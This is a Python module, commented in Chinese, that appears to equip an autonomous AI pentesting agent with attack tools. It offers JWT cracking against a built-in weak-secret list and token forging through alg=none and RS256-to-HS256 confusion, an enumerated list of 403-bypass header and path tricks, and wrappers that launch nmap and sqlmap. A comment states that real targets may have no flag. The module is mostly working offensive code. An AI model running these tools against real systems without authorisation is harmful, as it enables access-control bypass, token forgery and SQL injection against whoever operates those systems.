"""攻击工具包:模型表达意图,工具负责机械正确。

设计动机:flash 级模型用 bash 手搓 JWT/编码链/403 变体最容易翻车(且烧
token)。结构化工具 = playbook 里"症状→手法"知识的代码化:参数表达意图,
机械细节确定性执行,输出紧凑(省 token)。

- http:结构化请求 + 流量落档(observer 证据源);
- jwt:decode / crack(HS256 字典)/ forge(none/HS256,含 RS256→HS256
  算法混淆——公钥文本直接当 HMAC 密钥);
- bypass403:确定性变体枚举(路径/头/方法三类),命中的变体高亮;
- encode:base64/base64url/hex/url/html/rot13/unicode 编码链,可迭代;
- nmap:结构化参数(策略内建:跨度 ≤2048、速率钉 300),输出解析成
  紧凑端口表而不是原始喷涌;
- sqlmap:守卫封装(level≤3/risk≤2/--batch/超时上限),二进制缺失给
  干净报错。
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import html as html_mod
import json
import re
import shutil
import subprocess
import time
import urllib.parse
from typing import ClassVar

import httpx

from .base import ToolContext, ToolError, resolve_in_workspace, truncate
from .recon_state import ReconState

_WEAK_JWT_SECRETS = (
    "secret", "jwt_secret", "jwt-secret", "key", "your-256-bit-secret",
    "supersecret", "changeme", "password", "123456", "abc123", "test",
    "server_key", "serverkey", "mykey", "token_secret", "s3cr3t",
    "qwerty", "letmein", "admin", "hackme", "default", "iloveyou",
)

_NMAP_PORT_LINE = re.compile(r"^(\d+)/(tcp|udp)\s+(\S+)\s+(\S+)(.*)$")


# ================================================================== http


def _request(
    method: str,
    url: str,
    *,
    headers: dict | None = None,
    data: str | None = None,
    timeout: float = 15.0,
    follow_redirects: bool = False,
    verify: bool = True,
    proxy: str | None = None,
    transport: httpx.BaseTransport | None = None,
) -> tuple[int, dict, str]:
    try:
        client = httpx.Client(
            timeout=timeout,
            verify=verify,
            follow_redirects=follow_redirects,
            proxy=proxy,
            transport=transport,
        )
        try:
            response = client.request(
                method.upper(), url, headers=headers or {}, content=data
            )
        finally:
            client.close()
    except httpx.HTTPError as exc:
        raise ToolError(f"request failed: {type(exc).__name__}: {exc}") from exc
    body = response.text or ""
    return response.status_code, dict(response.headers), body


def _canon_header(name: str) -> str:
    return "-".join(part.capitalize() for part in name.split("-"))


def _host_port(url: str) -> tuple[str, int]:
    parts = urllib.parse.urlsplit(url)
    host = parts.hostname or ""
    port = parts.port or (443 if parts.scheme == "https" else 80)
    return host, port


def _format_http_response(status: int, headers: dict, body: str, limit: int) -> str:
    interesting = [
        f"{_canon_header(k)}: {v[:200]}"
        for k, v in headers.items()
        if k.lower() in ("content-type", "location", "server", "set-cookie", "www-authenticate")
    ]
    head = f"HTTP {status}"
    if interesting:
        head += "\n" + "\n".join(interesting)
    body = truncate(body, limit)
    return f"{head}\n\n{body}" if body else head


class HttpTool:
    name = "http"
    description = (
        "Structured HTTP request. Returns status + key headers + body (truncated). "
        "All requests are logged to http-log.jsonl. Prefer this over curl."
    )
    parameters: ClassVar[dict] = {
        "type": "object",
        "properties": {
            "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]},
            "url": {"type": "string"},
            "headers": {"type": "object", "description": "extra headers"},
            "data": {"type": "string", "description": "request body (raw)"},
            "timeout": {"type": "number"},
            "follow_redirects": {"type": "boolean"},
            "verify_tls": {"type": "boolean", "default": False},
            "proxy": {"type": "string", "description": "e.g. socks5://127.0.0.1:1080"},
        },
        "required": ["method", "url"],
    }

    def __init__(self, transport: httpx.BaseTransport | None = None) -> None:
        self._transport = transport

    def execute(self, args: dict, ctx: ToolContext) -> str:
        # 封禁感知:对该主机的退避判据命中时,请求前直接拒绝(exit-75 语义)
        host, port = _host_port(args["url"])
        state = ReconState(ctx.workspace)
        state.enforce(host)
        try:
            status, headers, body = _request(
                args["method"],
                args["url"],
                headers={str(k): str(v) for k, v in (args.get("headers") or {}).items()},
                data=args.get("data"),
                timeout=min(float(args.get("timeout", 15.0)), 60.0),
                follow_redirects=bool(args.get("follow_redirects", False)),
                verify=bool(args.get("verify_tls", False)),
                proxy=args.get("proxy"),
                transport=self._transport,
            )
        except ToolError:
            state.record(host, port, "error")
            raise
        state.record(host, port, "open")
        # 流量落档:observer 与复盘的证据源
        log_path = ctx.workspace / "http-log.jsonl"
        with log_path.open("a", encoding="utf-8") as fh:
            fh.write(
                json.dumps(
                    {
                        "ts": time.time(),
                        "method": args["method"],
                        "url": args["url"],
                        "status": status,
                        "resp_len": len(body),
                    },
                    ensure_ascii=False,
                )
                + "\n"
            )
        output = _format_http_response(status, headers, body, ctx.max_output_chars)
        snap = state.snapshot(host)
        return f"{output}\n[recon-state] {snap}" if snap else output


# ================================================================== jwt


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def _b64url_decode(text: str) -> bytes:
    padded = text + "=" * (-len(text) % 4)
    try:
        return base64.urlsafe_b64decode(padded.encode())
    except (binascii.Error, ValueError) as exc:
        raise ToolError(f"bad base64url segment: {exc}") from exc


def _jwt_hs256_sign(signing_input: str, key: str) -> str:
    digest = hmac.new(key.encode(), signing_input.encode(), hashlib.sha256).digest()
    return _b64url_encode(digest)


class JwtTool:
    name = "jwt"
    description = (
        "JWT toolkit. decode: show header/payload (no verify). crack: dictionary "
        "attack on HS256 secret (wordlist or built-in weak list). forge: build "
        "token with algorithm none or HS256 (pass the server public key as `key` "
        "for RS256->HS256 confusion)."
    )
    parameters: ClassVar[dict] = {
        "type": "object",
        "properties": {
            "action": {"type": "string", "enum": ["decode", "crack", "forge"]},
            "token": {"type": "string", "description": "for decode/crack"},
            "wordlist": {"type": "array", "items": {"type": "string"}},
            "wordlist_file": {"type": "string"},
            "payload": {"type": "object", "description": "for forge"},
            "algorithm": {"type": "string", "enum": ["none", "HS256"]},
            "key": {"type": "string", "description": "HS256 key (or pasted public key)"},
        },
        "required": ["action"],
    }

    def execute(self, args: dict, ctx: ToolContext) -> str:
        action = args["action"]
        if action == "decode":
            return self._decode(args.get("token", ""))
        if action == "crack":
            return self._crack(args, ctx)
        return self._forge(args)

    @staticmethod
    def _split(token: str) -> tuple[str, str, str]:
        parts = token.strip().split(".")
        if len(parts) != 3:
            raise ToolError(f"JWT needs 3 dot-separated parts, got {len(parts)}")
        return parts[0], parts[1], parts[2]

    def _decode(self, token: str) -> str:
        header_b64, payload_b64, sig_b64 = self._split(token)
        try:
            header = json.loads(_b64url_decode(header_b64))
            payload = json.loads(_b64url_decode(payload_b64))
        except json.JSONDecodeError as exc:
            raise ToolError(f"segment is not JSON: {exc}") from exc
        return (
            f"header:\n{json.dumps(header, ensure_ascii=False, indent=1)}\n"
            f"payload:\n{json.dumps(payload, ensure_ascii=False, indent=1)}\n"
            f"signature(raw b64url): {sig_b64}"
        )

    def _crack(self, args: dict, ctx: ToolContext) -> str:
        token = args.get("token", "")
        header_b64, payload_b64, sig_b64 = self._split(token)
        header = json.loads(_b64url_decode(header_b64))
        alg = header.get("alg", "")
        if alg != "HS256":
            return (
                f"alg={alg},不是 HS256——先用 forge 改造(alg=none 或 "
                "RS256→HS256 混淆:把公钥文本当 HMAC key)。"
            )
        candidates: list[str] = list(args.get("wordlist") or [])
        if args.get("wordlist_file"):
            path = resolve_in_workspace(ctx, args["wordlist_file"])
            candidates += [
                line.strip()
                for line in path.read_text(encoding="utf-8", errors="ignore").splitlines()
                if line.strip()
            ]
        if not candidates:
            candidates = list(_WEAK_JWT_SECRETS)
        signing_input = f"{header_b64}.{payload_b64}"
        for secret in candidates:
            if hmac.compare_digest(_jwt_hs256_sign(signing_input, secret), sig_b64):
                return f"CRACKED: secret = {secret!r}\nsigning_input={signing_input}"
        return f"未命中(尝试 {len(candidates)} 个候选)。换字典或考虑 forge 路线。"

    def _forge(self, args: dict) -> str:
        payload = args.get("payload") or {}
        if isinstance(payload, str):
            try:
                payload = json.loads(payload)
            except json.JSONDecodeError as exc:
                raise ToolError(f"payload 不是合法 JSON: {exc}") from exc
        algorithm = args.get("algorithm", "none")
        if algorithm == "none":
            header = {"alg": "none", "typ": "JWT"}
            head_b64 = _b64url_encode(json.dumps(header).encode())
            pay_b64 = _b64url_encode(json.dumps(payload, ensure_ascii=False).encode())
            return f"{head_b64}.{pay_b64}."
        key = args.get("key") or ""
        if not key:
            raise ToolError("HS256 forge 需要 key(RS256→HS256 混淆时传公钥全文)")
        header = {"alg": "HS256", "typ": "JWT"}
        head_b64 = _b64url_encode(json.dumps(header).encode())
        pay_b64 = _b64url_encode(json.dumps(payload, ensure_ascii=False).encode())
        sig = _jwt_hs256_sign(f"{head_b64}.{pay_b64}", key)
        return f"{head_b64}.{pay_b64}.{sig}"


# ================================================================== bypass403


def _bypass_variants(url: str) -> list[tuple[str, str, dict, str | None]]:
    """(label, effective_url, headers, method_override) 变体表。

    知识来源:resources/skills/waf-bypass + web playbook 的 403 绕过节,
    代码化后不再依赖模型逐条枚举。
    """
    parsed = urllib.parse.urlsplit(url)
    path = parsed.path or "/"
    origin = f"{parsed.scheme}://{parsed.netloc}"
    internal_ips = ["127.0.0.1", "10.10.10.10", "localhost"]

    variants: list[tuple[str, str, dict, str | None]] = [
        ("baseline(原样重放)", url, {}, None),
        ("X-Original-URL", url, {"X-Original-URL": path}, None),
        ("X-Rewrite-URL", url, {"X-Rewrite-URL": path}, None),
        ("X-Forwarded-Host=localhost", url, {"X-Forwarded-Host": "localhost"}, None),
        ("X-Host=localhost", url, {"X-Host": "localhost"}, None),
        ("X-Custom-IP-Authorization", url, {"X-Custom-IP-Authorization": "127.0.0.1"}, None),
        ("X-Real-IP=127.0.0.1", url, {"X-Real-IP": "127.0.0.1"}, None),
        ("Referer=同源", url, {"Referer": origin + "/"}, None),
        ("方法改 POST", url, {}, "POST"),
        ("方法改 PATCH", url, {}, "PATCH"),
    ]
    for ip in internal_ips:
        variants.append((f"X-Forwarded-For={ip}", url, {"X-Forwarded-For": ip}, None))

    path_variants = [
        ("路径 /%2e/", f"{origin}/%2e{path}"),
        ("路径双斜杠 //", origin + "//" + path.lstrip("/")),
        ("路径 /.;/", origin + "/.;/" + path.lstrip("/")),
        ("路径 /..;/", origin + "/..;/" + path.lstrip("/")),
        ("尾部 %20", url + "%20"),
        ("尾部 %09", url + "%09"),
        ("尾部 /. ", url + "/."),
        ("尾部 /*", url + "/*"),
        ("尾部 ?", url + "?"),
    ]
    for label, effective in path_variants:
        variants.append((label, effective, {}, None))
    return variants


class Bypass403Tool:
    name = "bypass403"
    description = (
        "Deterministic 403-bypass enumeration: replays the URL across ~25 "
        "variants (headers / path tricks / methods) and highlights any response "
        "differing from the 403 baseline."
    )
    parameters: ClassVar[dict] = {
        "type": "object",
        "properties": {
            "url": {"type": "string"},
            "headers": {"type": "object", "description": "auth headers to keep"},
        },
        "required": ["url"],
    }

    def __init__(self, transport: httpx.BaseTransport | None = None) -> None:
        self._transport = transport

    def execute(self, args: dict, ctx: ToolContext) -> str:
        # 封禁感知:一轮 ~25 发变体是典型"撞黑洞"放大器,前置拦截 + 全程入账
        host, port = _host_port(args["url"])
        state = ReconState(ctx.workspace)
        state.enforce(host)
        base_headers = {str(k): str(v) for k, v in (args.get("headers") or {}).items()}
        rows: list[str] = []
        baseline_status: int | None = None
        for label, effective_url, variant_headers, method_override in _bypass_variants(args["url"]):
            headers = {**base_headers, **variant_headers}
            method = method_override or "GET"
            try:
                status, _, body = _request(
                    method, effective_url, headers=headers,
                    timeout=10.0, verify=False, transport=self._transport,
                )
            except ToolError as exc:
                state.record(host, port, "error")
                rows.append(f"✗ [{label}] error: {str(exc)[:80]}")
                continue
            state.record(host, port, "open")  # 任一变体有响应 = 端口活着
            if baseline_status is None:
                baseline_status = status
            hit = status != baseline_status
            mark = "HIT" if hit else "·"
            rows.append(f"{mark} [{label}] {status} len={len(body)}")
            if hit:
                rows.append(f"    → 变体命中,有效请求: {method} {effective_url} headers={variant_headers}")
        summary = f"baseline={baseline_status}\n" + "\n".join(rows)
        return summary if any(r.startswith("HIT") for r in rows) else summary + "\n(无变体改变响应;参考 waf-bypass 技能换编码/载体路线)"


# ================================================================== encode


class EncodeTool:
    name = "encode"
    description = (
        "Deterministic encode/decode: base64, base64url, hex, url, html, rot13, "
        "unicode. `iterations` applies repeatedly (chaining)."
    )
    parameters: ClassVar[dict] = {
        "type": "object",
        "properties": {
            "op": {"type": "string", "enum": ["encode", "decode"]},
            "scheme": {"type": "string", "enum": ["base64", "base64url", "hex", "url", "html", "rot13", "unicode"]},
            "text": {"type": "string"},
            "iterations": {"type": "integer", "default": 1},
        },
        "required": ["op", "scheme", "text"],
    }

    @staticmethod
    def _apply(op: str, scheme: str, text: str) -> str:
        try:
            if op == "encode":
                if scheme == "base64":
                    return base64.b64encode(text.encode()).decode()
                if scheme == "base64url":
                    return _b64url_encode(text.encode())
                if scheme == "hex":
                    return text.encode().hex()
                if scheme == "url":
                    return urllib.parse.quote(text, safe="")
                if scheme == "html":
                    return html_mod.escape(text)
                if scheme == "rot13":
                    import codecs
                    return codecs.encode(text, "rot13")
                if scheme == "unicode":
                    return text.encode("unicode_escape").decode()
            else:
                if scheme == "base64":
                    return base64.b64decode(text).decode(errors="replace")
                if scheme == "base64url":
                    return _b64url_decode(text).decode(errors="replace")
                if scheme == "hex":
                    return bytes.fromhex(text).decode(errors="replace")
                if scheme == "url":
                    return urllib.parse.unquote(text)
                if scheme == "html":
                    return html_mod.unescape(text)
                if scheme == "rot13":
                    import codecs
                    return codecs.encode(text, "rot13")
                if scheme == "unicode":
                    return text.encode().decode("unicode_escape")
        except (binascii.Error, ValueError, UnicodeDecodeError) as exc:
            raise ToolError(f"{op} {scheme} failed: {exc}") from exc
        raise ToolError(f"unknown scheme {scheme!r}")

    def execute(self, args: dict, ctx: ToolContext) -> str:
        result = str(args["text"])
        for _ in range(max(1, int(args.get("iterations", 1)))):
            result = self._apply(args["op"], args["scheme"], result)
        return result


# ================================================================== nmap


class NmapTool:
    name = "nmap"
    description = (
        "Guarded nmap: pass ports (list or '1-2000') or top_ports. Rate pinned, "
        "span <= 2048 enforced, output parsed to a compact open-port table. "
        "Use this instead of bash nmap."
    )
    parameters: ClassVar[dict] = {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "single host/IP only"},
            "ports": {"type": "string", "description": "e.g. '21,22,80' or '1-2000'"},
            "top_ports": {"type": "integer"},
            "version": {"type": "boolean", "description": "light service detection"},
            "rate": {"type": "integer", "description": "max-rate, capped at 600"},
            "timeout": {"type": "number"},
        },
        "required": ["target"],
    }

    MAX_SPAN = 2048
    RATE_CAP = 600

    @classmethod
    def build_command(cls, args: dict) -> str:
        if not args.get("ports") and not args.get("top_ports"):
            args = {**args, "top_ports": 200}
        parts = ["nmap", "-sT", "-Pn", "-n", "--open"]
        if args.get("top_ports"):
            parts.append(f"--top-ports {int(args['top_ports'])}")
        if args.get("ports"):
            spec = str(args["ports"])
            span = _port_span(spec)
            if span is None or span > cls.MAX_SPAN:
                raise ToolError(
                    f"端口跨度超限(≤{cls.MAX_SPAN}):{spec!r};用 top_ports 或明确端口列表"
                )
            parts.append(f"-p {spec}")
        if args.get("version"):
            parts.append("-sV --version-light")
        parts.append(f"--max-rate {min(int(args.get('rate', 300)), cls.RATE_CAP)}")
        parts.append(str(args["target"]))
        return " ".join(parts)

    def execute(self, args: dict, ctx: ToolContext) -> str:
        if shutil.which("nmap") is None:
            raise ToolError("nmap 二进制不存在(物理层镜像内可用;本机 brew install nmap)")
        target = str(args["target"])
        state = ReconState(ctx.workspace)
        state.enforce(target)
        prev_open = {
            r["port"] for r in state.records_for(target)
            if r["state"] == "open" and r["port"] is not None
        }
        command = self.build_command(args)
        timeout = min(float(args.get("timeout", 120.0)), 300.0)
        try:
            proc = subprocess.run(
                command, shell=True, cwd=ctx.workspace, capture_output=True,
                text=True, timeout=timeout, check=False,
            )
        except subprocess.TimeoutExpired:
            state.record(target, None, "error")
            raise ToolError(f"nmap 超时(>{timeout}s):缩小范围或分批扫") from None
        open_lines, summary = _parse_nmap(proc.stdout)
        current_open: set[int] = set()
        for line in open_lines:
            portno = line.split("/", 1)[0]
            if portno.isdigit():
                current_open.add(int(portno))
                state.record(target, int(portno), "open")
        # 差集检测:--open 模式下之前 open 的端口从结果里消失 = filtered 等价
        # 信号(0002 实测的"碰哪个端口哪个端口死")。仅在 -p 明确给出覆盖
        # 集时生效——top_ports 的覆盖集不可枚举,消失可能只是没扫到。
        covered = _expand_ports(str(args["ports"])) if args.get("ports") else None
        if covered is not None:
            for portno in (prev_open & covered) - current_open:
                state.record(target, portno, "filtered")
        output = "\n".join(open_lines) if open_lines else "(无开放端口)"
        if summary:
            output += f"\n{summary}"
        if proc.returncode != 0:
            output += f"\n[exit {proc.returncode}] {proc.stderr.strip()[:300]}"
        snap = state.snapshot(target)
        return f"{output}\n[recon-state] {snap}" if snap else output


def _expand_ports(spec: str | None) -> set[int] | None:
    """把 -p 端口规格展开成集合;任何解析不出的部分 → None(放弃差集)。

    保守方向:覆盖集不可靠宁可不算,误把活端口记 filtered 会假触发退避。
    """
    if not spec:
        return None
    ports: set[int] = set()
    for part in str(spec).split(","):
        part = part.strip()
        if ":" in part and part.split(":", 1)[0] in ("T", "U"):
            part = part.split(":", 1)[1]
        if not part:
            continue
        if "-" in part:
            lo, _, hi = part.rpartition("-")
            if not lo.isdigit() or not hi.isdigit() or int(hi) < int(lo):
                return None
            ports.update(range(int(lo), int(hi) + 1))
        elif part.isdigit():
            ports.add(int(part))
        else:
            return None
    return ports or None


def _port_span(spec: str) -> int | None:
    total = 0
    for part in spec.split(","):
        part = part.strip()
        if ":" in part and part.split(":", 1)[0] in ("T", "U"):
            part = part.split(":", 1)[1]
        if part in ("-", "*"):
            return None
        if "-" in part:
            lo, _, hi = part.rpartition("-")
            try:
                total += int(hi) - int(lo) + 1
            except ValueError:
                return None
        elif part.isdigit():
            total += 1
    return total


def _parse_nmap(raw: str) -> tuple[list[str], str]:
    open_lines: list[str] = []
    summary = ""
    for line in raw.splitlines():
        match = _NMAP_PORT_LINE.match(line.strip())
        if match:
            port, proto, state, service = match.group(1), match.group(2), match.group(3), match.group(4)
            extra = match.group(5).strip()
            if state == "open":
                open_lines.append(f"{port}/{proto} {service} {extra}".strip())
        elif line.startswith("Nmap done"):
            summary = line.strip()
    return open_lines, summary


# ================================================================== sqlmap


class SqlmapTool:
    name = "sqlmap"
    description = (
        "Guarded sqlmap wrapper: batch mode, level<=3, risk<=2, timeout cap. "
        "Parse target/data from args instead of shell splicing."
    )
    parameters: ClassVar[dict] = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "full URL with params"},
            "data": {"type": "string", "description": "POST body"},
            "cookie": {"type": "string"},
            "level": {"type": "integer"},
            "risk": {"type": "integer"},
            "technique": {"type": "string", "description": "e.g. 'BT' blind+time"},
            "timeout": {"type": "number"},
        },
        "required": ["url"],
    }

    @staticmethod
    def build_command(args: dict) -> str:
        parts = ["sqlmap", "-u", args["url"], "--batch", "--random-agent"]
        if args.get("data"):
            parts += ["--data", args["data"]]
        if args.get("cookie"):
            parts += ["--cookie", args["cookie"]]
        parts.append(f"--level={min(int(args.get('level', 1)), 3)}")
        parts.append(f"--risk={min(int(args.get('risk', 1)), 2)}")
        if args.get("technique"):
            parts.append(f"--technique={args['technique']}")
        return " ".join(parts)

    def execute(self, args: dict, ctx: ToolContext) -> str:
        if shutil.which("sqlmap") is None:
            raise ToolError("sqlmap 二进制不存在(物理层镜像内可用)")
        command = self.build_command(args)
        timeout = min(float(args.get("timeout", 240.0)), 600.0)
        try:
            proc = subprocess.run(
                command, shell=True, cwd=ctx.workspace, capture_output=True,
                text=True, timeout=timeout, check=False,
            )
        except subprocess.TimeoutExpired:
            raise ToolError(f"sqlmap 超时(>{timeout}s):先手工确认注入点再跑") from None
        # 只回灌关键判定行,不倒原始日志
        keys = ("back-end DBMS", "is vulnerable", "placeholder", "available databases", "Parameter:")
        hits = [
            line.strip()
            for line in proc.stdout.splitlines()
            if any(k.lower() in line.lower() for k in keys)
        ]
        output = "\n".join(hits[:40]) if hits else truncate(proc.stdout[-2000:], 4000)
        return output + f"\n[exit {proc.returncode}] 全量日志见工作区 sqlmap 输出(已截取判定行)"


# ================================================================== finding


class FindingTool:
    """真实目标通常没有 flag:确认的漏洞本身就是交付物。"""

    name = "finding"
    description = (
        "Record a CONFIRMED security finding (vulnerability/credential/intel) "
        "with evidence (request + response excerpt). Use it the moment a vuln is "
        "confirmed — this is the deliverable on real targets where no flag exists. "
        "Flags are collected automatically; findings must be recorded by you."
    )
    parameters: ClassVar[dict] = {
        "type": "object",
        "properties": {
            "title": {"type": "string", "description": "一句话漏洞标题"},
            "evidence": {"type": "string", "description": "复现请求/响应摘录"},
            "severity": {"type": "string", "enum": ["high", "medium", "low"]},
            "kind": {"type": "string", "enum": ["vuln", "cred", "info"]},
            "endpoint": {"type": "string"},
        },
        "required": ["title", "evidence"],
    }

    def execute(self, args: dict, ctx: ToolContext) -> str:
        from ..inbox import FindingsInbox

        inbox = FindingsInbox(ctx.workspace / "flags.json")
        added = inbox.add_finding(
            args["title"],
            args["evidence"],
            severity=str(args.get("severity", "medium")),
            kind=str(args.get("kind", "vuln")),
            endpoint=str(args.get("endpoint", "")),
        )
        n = len(inbox.findings())
        return (
            f"finding 已记录(#{n}):{args['title'][:80]}"
            if added else f"重复 finding(title 已存在),当前共 {n} 条"
        )


# ================================================================== 注册


def register_attack_tools(registry, transport: httpx.BaseTransport | None = None) -> None:
    from .audit import AuditTool
    from .binary import BinaryTool
    from .cloud import CloudTool
    from .cve import CveTool
    from .hypothesis import HypothesisTool
    from .loot import LootTool
    from .osint import OsintTool
    from .weapon import WeaponTool

    registry.register(HttpTool(transport))
    registry.register(JwtTool())
    registry.register(Bypass403Tool(transport))
    registry.register(EncodeTool())
    registry.register(NmapTool())
    registry.register(SqlmapTool())
    registry.register(OsintTool(transport))
    registry.register(CveTool(transport))
    registry.register(CloudTool(transport))
    registry.register(WeaponTool(transport))
    registry.register(HypothesisTool())
    registry.register(AuditTool())
    registry.register(BinaryTool())
    registry.register(LootTool())
    registry.register(FindingTool())
